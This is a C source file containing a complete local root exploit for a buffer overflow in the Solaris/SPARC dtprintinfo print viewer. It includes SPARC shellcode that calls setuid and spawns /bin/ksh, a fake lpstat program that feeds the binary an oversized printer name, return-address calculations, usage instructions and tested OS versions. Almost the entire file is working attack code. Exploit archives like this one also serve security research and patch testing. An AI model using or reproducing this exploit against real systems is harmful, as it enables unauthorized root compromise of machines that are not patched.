/*
 * raptor_dtprintname_sparc.c - dtprintinfo 0day, Solaris/SPARC
 * Copyright (c) 2004-2019 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * 0day buffer overflow in the dtprintinfo(1) CDE Print Viewer, leading to
 * local root. Many thanks to Dave Aitel for discovering this vulnerability
 * and for his interesting research activities on Solaris/SPARC.
 *
 * "None of my dtprintinfo work is public, other than that 0day pack being
 * leaked to all hell and back. It should all basically still work. Let's
 * keep it that way, cool? :>" -- Dave Aitel
 *
 * Usage:
 * $ gcc raptor_dtprintname_sparc.c -o raptor_dtprintname_sparc -Wall
 * [on your xserver: disable the access control]
 * $ ./raptor_dtprintname_sparc 192.168.1.1:0
 * [...]
 * # id
 * uid=0(root) gid=10(staff)
 * #
 *
 * Tested on:
 * SunOS 5.7 Generic_106541-21 sun4u sparc SUNW,Ultra-1
 * SunOS 5.8 Generic_108528-13 sun4u sparc SUNW,Ultra-5_10
 * SunOS 5.9 Generic sun4u sparc SUNW,Ultra-5_10
 * [SunOS 5.10 is also vulnerable, the exploit might require some tweaking]
 */

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/systeminfo.h>

#define INFO1	"raptor_dtprintname_sparc.c - dtprintinfo 0day, Solaris/SPARC"
#define INFO2	"Copyright (c) 2004-2019 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN	"/usr/dt/bin/dtprintinfo"	// the vulnerable program
#define	BUFSIZE	301				// size of the printer name

/* voodoo macros */
#define	VOODOO32(_,__,___)	{_--;_+=(__+___-1)%4-_%4<0?8-_%4:4-_%4;}
#define	VOODOO64(_,__,___)	{_+=7-(_+(__+___+1)*4+3)%8;}

char sc[] = /* Solaris/SPARC shellcode (12 + 12 + 48 = 72 bytes) */
/* double setuid() */
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"
/* execve() */
"\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x03\xe0\x20"
"\x92\x02\x20\x10\xc0\x22\x20\x08\xd0\x22\x20\x10\xc0\x22\x20\x14"
"\x82\x10\x20\x0b\x91\xd0\x20\x08/bin/ksh";

/* globals */
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	set_val(char *buf, int pos, int val);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE], var[16];
	char	platform[256], release[256], display[256];
	int	i, offset, ret, var_pos;
	int	plat_len, prog_len, rel;

	char	*arg[2] = {"foo", NULL};
	int	arg_len = 4, arg_pos = 1;

	int	sb = ((int)argv[0] | 0xffff) & 0xfffffffc;

	/* fake lpstat code */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* get ret address from environment */
		ret = (int)strtoul(getenv("RET"), (char **)NULL, 0);

		/* prepare the evil printer name */
		memset(buf, 'A', sizeof(buf));
		buf[sizeof(buf) - 1] = 0x0;

		/* fill with return address */
		for (i = 0; i < BUFSIZE; i += 4)
			set_val(buf, i, ret - 8);

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for %s: /dev/null\n", buf);
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: %s\n", buf);
		}
		exit(0);
	}

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc != 2) {
		fprintf(stderr, "usage: %s xserver:display\n\n", argv[0]);
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);

	/* get some system information */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	rel = atoi(release + 2);

	/* fill the envp, keeping padding */
	add_env(sc);
	var_pos = env_pos;
	add_env("RET=0x41414141");
	add_env(display);
	add_env("PATH=.:/usr/bin");
	add_env("HOME=/tmp");
	add_env(NULL);

	/* calculate the offset to argv[0] (voodoo magic) */
	plat_len = strlen(platform) + 1;
	prog_len = strlen(VULN) + 1;
	offset = arg_len + env_len + plat_len + prog_len;
	if (rel > 7)
		VOODOO64(offset, arg_pos, env_pos)
	else
		VOODOO32(offset, plat_len, prog_len)

	/* calculate the needed addresses */
	ret = sb - offset + arg_len;

	/* overwrite the RET env var with the right ret address */
	sprintf(var, "RET=0x%x", ret);
	env[var_pos] = var;

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");

	/* print some output */
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using ret address\t: 0x%p\n\n", (void *)ret);

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(0);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return(env_len);
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return(env_len);
}

/*
 * set_val(): copy a dword inside a buffer
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0xff000000) >> 24;
	buf[pos + 1] =	(val & 0x00ff0000) >> 16;
	buf[pos + 2] =	(val & 0x0000ff00) >> 8;
	buf[pos + 3] =	(val & 0x000000ff);
}
